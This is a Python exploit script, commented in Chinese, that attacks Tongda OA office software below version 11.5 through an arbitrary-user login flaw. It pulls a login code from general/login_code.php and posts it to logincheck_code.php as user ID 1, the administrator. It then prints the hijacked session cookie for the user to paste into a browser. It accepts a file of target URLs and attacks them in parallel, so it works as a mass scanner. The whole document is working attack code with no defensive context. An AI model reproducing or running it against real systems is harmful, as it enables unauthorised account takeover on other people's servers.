#通达OA版本  V11.X < V11.5
import time
import argparse
import requests
import multiprocessing
from rich.console import Console
import urllib3
import json

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=target_url+'general/login_code.php'
    console.print(now_time() + " [INFO]     正在检测通达OA_v11.5_任意用户登录漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False)
        responseText = str(response.text).split('{')
        codeUid = responseText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = target_url+'logincheck_code.php'
        response = requests.post(getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': '1'},headers=headers)
        tmp_cookie = response.headers['Set-Cookie']
        headers["Cookie"] = tmp_cookie
        login_url=target_url + 'general/index.php'
        check_available = requests.get(login_url,headers=headers)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                console.print(now_time() + ' [SUCCESS]  存在通达OA_v11.5_任意用户登录漏洞,粘贴cookie尝试登录:{}'.format(tmp_cookie), style='bold green')
                console.print(now_time() + ' [SUCCESS]  登录路径为:{}'.format(login_url), style='bold green')
   
            else:
                console.print(now_time() + " [WARNING]  不存在通达OA_v11.5_任意用户登录漏洞", style='bold red')
        else:
                console.print(now_time() + " [WARNING]  不存在通达OA_v11.5_任意用户登录漏洞", style='bold red')
    except: 
        console.print(now_time() + ' [WARNING]  未知错误，目标可能拒绝访问', style='bold red')
        
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
